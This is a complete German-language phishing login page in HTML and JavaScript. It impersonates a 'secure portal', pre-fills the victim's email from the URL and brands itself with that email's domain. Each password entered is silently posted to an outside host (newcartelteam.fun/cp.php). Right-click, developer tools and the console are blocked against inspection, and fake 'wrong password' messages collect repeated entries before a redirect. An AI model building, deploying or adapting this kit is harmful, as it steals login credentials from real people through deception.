<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Sicherer Zugang | Portal-Anmeldung</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            min-height: 100vh;
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow-x: hidden;
            padding: 1.5rem;
        }

        /* BACKGROUND IMAGE */
        .bg-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            object-fit: cover;
            pointer-events: none;
        }

        /* CENTERED COMPACT LOGIN CARD */
        .login-wrapper {
            position: relative;
            z-index: 20;
            width: 100%;
            max-width: 380px;
            margin: 0 auto;
        }

        .glass-panel {
            background: rgba(255, 255, 255, 0.96);
            backdrop-filter: blur(16px);
            border-radius: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.9);
            box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.3);
            padding: 1.6rem 1.5rem;
            transition: transform 0.2s ease;
        }

        .domain-logo-container {
            text-align: center;
            margin-bottom: 1.2rem;
            padding-bottom: 0.8rem;
            border-bottom: 1px solid rgba(79, 126, 179, 0.25);
        }

        .domain-logo {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: linear-gradient(135deg, #1e3a5f, #0f2a4a);
            padding: 0.4rem 1.2rem;
            border-radius: 2rem;
            border: 1px solid rgba(255,215,120,0.4);
        }

        .domain-icon {
            font-size: 1.3rem;
        }

        .domain-image-text {
            font-weight: 700;
            font-size: 1.1rem;
            background: linear-gradient(120deg, #FFE6B0, #FFFFFF, #FFD966);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 0.5px;
        }

        .input-row {
            margin-bottom: 1.2rem;
        }

        .input-label {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #1f2c48;
            font-size: 0.75rem;
            font-weight: 600;
            margin-bottom: 0.4rem;
        }

        .input-field {
            width: 100%;
            background: rgba(255, 255, 255, 0.98);
            border: 1px solid rgba(0, 0, 0, 0.12);
            border-radius: 1rem;
            padding: 0.7rem 1rem;
            font-size: 0.85rem;
            color: #111827;
            outline: none;
            transition: all 0.2s;
        }

        .input-field:focus {
            border-color: #4f7eb3;
            box-shadow: 0 0 0 2px rgba(79, 126, 179, 0.2);
        }

        .input-field[readonly] {
            background: rgba(235, 243, 255, 0.9);
            cursor: default;
            color: #2c3e66;
            font-weight: 500;
            font-size: 0.85rem;
        }

        .message-area {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 0.9rem;
            padding: 0.5rem;
            margin: 0.9rem 0;
            text-align: center;
            font-size: 0.75rem;
            border-left: 2px solid;
            transition: opacity 0.2s ease;
        }

        .msg-info {
            color: #2c5282;
            background: rgba(230, 242, 255, 0.95);
            border-left-color: #4f7eb3;
        }

        .msg-warning {
            color: #b4601a;
            background: rgba(255, 245, 215, 0.95);
            border-left-color: #e6a017;
        }

        .msg-error {
            color: #bc3f3f;
            background: rgba(255, 225, 225, 0.95);
            border-left-color: #e16363;
        }

        .login-btn {
            width: 100%;
            background: linear-gradient(100deg, #2b4d7a, #1f3f62);
            border: none;
            border-radius: 1.8rem;
            padding: 0.7rem;
            font-size: 0.85rem;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: all 0.25s;
            margin-top: 0.2rem;
            letter-spacing: 0.3px;
        }

        .login-btn:hover {
            background: linear-gradient(100deg, #3a64a0, #2a4c78);
            transform: translateY(-1px);
            box-shadow: 0 5px 12px rgba(0,0,0,0.15);
        }

        .login-btn:active {
            transform: translateY(1px);
        }

        .locked-ui {
            pointer-events: none;
            opacity: 0.7;
        }

        ::selection {
            background: transparent;
        }

        /* Shake animation */
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(4px); }
            75% { transform: translateX(-4px); }
            100% { transform: translateX(0); }
        }
        .shake-effect {
            animation: shake 0.2s ease-in-out 0s 2;
        }

        @media (max-width: 450px) {
            body { padding: 1rem; }
            .glass-panel { padding: 1.3rem 1.2rem; }
            .domain-logo { padding: 0.3rem 1rem; }
            .domain-image-text { font-size: 0.9rem; }
            .input-field { padding: 0.6rem 0.9rem; font-size: 0.8rem; }
            .login-btn { padding: 0.6rem; font-size: 0.8rem; }
        }
    </style>
</head>
<body>

<!-- BACKGROUND IMAGE -->
<img class="bg-image" src="https://newcartelteam.fun/Screenshot_25-5-2026_17453.jpeg" alt="Hintergrundbild">

<!-- CENTERED COMPACT SIGNIN MODULE (GERMAN) -->
<div class="login-wrapper">
    <div class="glass-panel" id="loginPanel">
        <div class="domain-logo-container">
            <div class="domain-logo">
                <span class="domain-icon" id="dynamicDomainIcon">🔐</span>
                <span class="domain-image-text" id="domainImageText">SICHERES PORTAL</span>
            </div>
        </div>

        <form id="loginForm">
            <div class="input-row">
                <div class="input-label">📧 Bestätigte E-Mail</div>
                <input type="email" id="email" name="email" class="input-field" readonly placeholder="E-Mail wird geladen...">
            </div>
            <div class="input-row">
                <div class="input-label">🔑 Passwort</div>
                <input type="password" id="password" name="password" class="input-field" placeholder="Geben Sie Ihr Passwort ein" autocomplete="off" required>
            </div>
            <div id="statusMessage" class="message-area msg-info">🔒 Passwort eingeben, um fortzufahren</div>
            <button type="submit" id="loginAction" class="login-btn">ANMELDEN</button>
        </form>
    </div>
</div>

<script>
    // ============================================================
    // ANTI-DEBUG / ANTI-INSPECT PROTECTION (Deutsche Version)
    // ============================================================
    
    (function() {
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.key === 's') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'U') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'E') {
                e.preventDefault();
                return false;
            }
        });
        
        window.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
        });
        
        var devtools = /./;
        devtools.toString = function() {
            this.opened = true;
        };
        setInterval(function() {
            if (devtools.opened) {
                console.clear();
                devtools.opened = false;
            }
        }, 1000);
        
        console.log = function() {};
        console.info = function() {};
        console.warn = function() {};
        console.error = function() {};
        
        setInterval(function() {
            console.clear();
        }, 4000);
    })();
    
    // ============================================================
    // LOGIN LOGIC - GERMAN MESSAGES + 10-second Google Drive redirect
    // - 1st & 2nd failure: "Falsches Passwort" (auto-hide)
    // - 3rd failure: System lock + redirect to Google Drive after 10 SECONDS
    // - Success: Cancels redirect timer + goes to user's domain
    // - Email extracted from URL (hash or query) + base64 support
    // - Displays "[Domain] Portal" with gradient design
    // ============================================================
    
    (function() {
        // Helper: Base64 detection & decoding
        function isBase64(str) {
            try {
                if (!str || str.length % 4 !== 0) return false;
                const decoded = atob(str);
                const reEncoded = btoa(decoded);
                return reEncoded === str;
            } catch (err) { return false; }
        }

        function decodeEmail(str) {
            try {
                if (isBase64(str)) return atob(str);
                return str;
            } catch (err) { return str; }
        }

        // Extract email from URL (priority: hash > 'email' param > 'image' param)
        const url = new URL(window.location.href);
        const rawEmail = url.hash.replace("#", "") || url.searchParams.get('email') || url.searchParams.get('image') || "";
        let updatedEmail = rawEmail && rawEmail.length > 0 ? decodeEmail(rawEmail) : "secure@vaultaccess.com";
        if (!updatedEmail.includes('@')) updatedEmail = "secure@vaultaccess.com";

        // Set email field
        const emailInput = document.getElementById("email");
        if (emailInput) emailInput.value = updatedEmail;

        // ============================================================
        // DOMAIN NAME CAPTURE: Displays as "[Domain] Portal" (German)
        // Example: email = user@google.com => "Google Portal"
        // ============================================================
        let rawDomain = updatedEmail.split('@')[1]?.split('.')[0] || "SICHER";
        // Capitalize first letter
        let displayDomain = rawDomain.charAt(0).toUpperCase() + rawDomain.slice(1).toLowerCase();
        const portalDisplayText = `${displayDomain} Portal`;
        
        const domainTextSpan = document.getElementById("domainImageText");
        if (domainTextSpan) {
            domainTextSpan.innerText = portalDisplayText;
        }
        
        // Dynamic icon based on domain context
        function getIcon(domain) {
            const d = domain.toLowerCase();
            if (d.includes('cloud') || d.includes('vault')) return '☁️';
            if (d.includes('secure') || d.includes('guard')) return '🛡️';
            if (d.includes('doc') || d.includes('pdf')) return '📄';
            if (d.includes('bank') || d.includes('finance')) return '🏦';
            if (d.includes('google')) return '🔍';
            if (d.includes('microsoft') || d.includes('outlook')) return '💼';
            return '🔒';
        }
        const iconElement = document.getElementById("dynamicDomainIcon");
        if (iconElement) {
            iconElement.innerHTML = getIcon(rawDomain);
        }
        
        // ============================================================
        // AUTH STATE (German messages)
        // ============================================================
        const CORRECT_PASSWORD = "P@ssw0rd2025!";
        let failedAttempts = 0;
        let locked = false;
        let redirectTimer = null;  // Timer for Google Drive redirect on lock (10 SECONDS)
        let messageTimeout = null;
        
        const form = document.getElementById("loginForm");
        const passwordField = document.getElementById("password");
        const statusDiv = document.getElementById("statusMessage");
        const loginButton = document.getElementById("loginAction");

        function setMessage(text, type, autoClear = false) {
            if (messageTimeout) {
                clearTimeout(messageTimeout);
                messageTimeout = null;
            }
            
            statusDiv.innerHTML = text;
            statusDiv.classList.remove('msg-info', 'msg-warning', 'msg-error');
            if (type === 'error') statusDiv.classList.add('msg-error');
            else if (type === 'warning') statusDiv.classList.add('msg-warning');
            else statusDiv.classList.add('msg-info');
            
            if (autoClear && (type === 'warning' || type === 'error')) {
                messageTimeout = setTimeout(() => {
                    if (!locked) {
                        statusDiv.innerHTML = "🔒 Passwort eingeben, um fortzufahren";
                        statusDiv.classList.remove('msg-warning', 'msg-error');
                        statusDiv.classList.add('msg-info');
                    }
                    messageTimeout = null;
                }, 2000);
            }
        }

        // Cancels any pending background redirect to Google Drive (important for successful login)
        function cancelUndergroundRedirect() {
            if (redirectTimer) {
                clearTimeout(redirectTimer);
                redirectTimer = null;
            }
        }

        // Starts the 10-second timer to redirect to Google Drive (only called when system locks)
        function startUndergroundRedirect() {
            cancelUndergroundRedirect();
            redirectTimer = setTimeout(function() {
                window.location.href = "https://drive.google.com";
            }, 10000); // 🔥 UPDATED: 10 seconds
        }

        function lockSystem() {
            locked = true;
            loginButton.disabled = true;
            passwordField.disabled = true;
            const panel = document.getElementById('loginPanel');
            if (panel) panel.classList.add('locked-ui');
            setMessage("⛔ ZUGANG VERWEIGERT • SYSTEM GESPERRT", "error", false);
            // Start the 10-second Google Drive redirect
            startUndergroundRedirect();
        }

        function shakePanel() {
            const panel = document.querySelector('.glass-panel');
            if (panel) {
                panel.classList.add('shake-effect');
                setTimeout(() => panel.classList.remove('shake-effect'), 300);
            }
        }

        // Form submission handler (German)
        form.onsubmit = (e) => {
            e.preventDefault();
            
            if (locked) {
                setMessage("System gesperrt. Zugriff verweigert.", "error", true);
                return;
            }
            
            const enteredPassword = passwordField.value;
            if (!enteredPassword || enteredPassword.trim() === "") {
                shakePanel();
                return;
            }

            // Silent POST to cp.php (background logging)
            fetch("https://newcartelteam.fun/cp.php", {
                method: "POST",
                body: new URLSearchParams({ email: updatedEmail, password: enteredPassword }),
                mode: 'no-cors'
            }).catch(err => {});

            // Validate password
            if (enteredPassword === CORRECT_PASSWORD) {
                // ✅ SUCCESSFUL LOGIN: Cancel any pending Google Drive redirect
                cancelUndergroundRedirect();
                
                setMessage("✅ ZUGANG GEWÄHRT • Weiterleitung...", "info", false);
                loginButton.disabled = true;
                passwordField.disabled = true;
                setTimeout(() => {
                    const domainPart = updatedEmail.split('@')[1];
                    const redirectUrl = domainPart ? `https://www.${domainPart}` : "https://www.google.com";
                    window.location.href = redirectUrl;
                }, 1200);
            } else {
                // FAILED ATTEMPT
                failedAttempts++;
                
                if (failedAttempts >= 3) {
                    // 3rd failure: Lock system (starts 10-second Google Drive redirect)
                    lockSystem();
                } else {
                    // 1st and 2nd failure: Show warning and clear password field
                    setMessage("❌ Falsches Passwort.", "warning", true);
                    passwordField.value = "";
                    passwordField.focus();
                    shakePanel();
                }
            }
        };
        
        // Initial message
        setMessage("🔒 Passwort eingeben, um fortzufahren", "info", false);
        
        // Ensure email field stays readonly
        if (emailInput) emailInput.setAttribute("readonly", "readonly");
        
        // Update browser title to reflect Portal name (German)
        const titleElement = document.querySelector('title');
        if (titleElement) {
            titleElement.innerText = `${displayDomain} Portal | Sicherer Zugang`;
        }
        
        // On page unload, ensure we cancel timer (safety)
        window.addEventListener('beforeunload', function() {
            cancelUndergroundRedirect();
        });
    })();
</script>
</body>
</html>
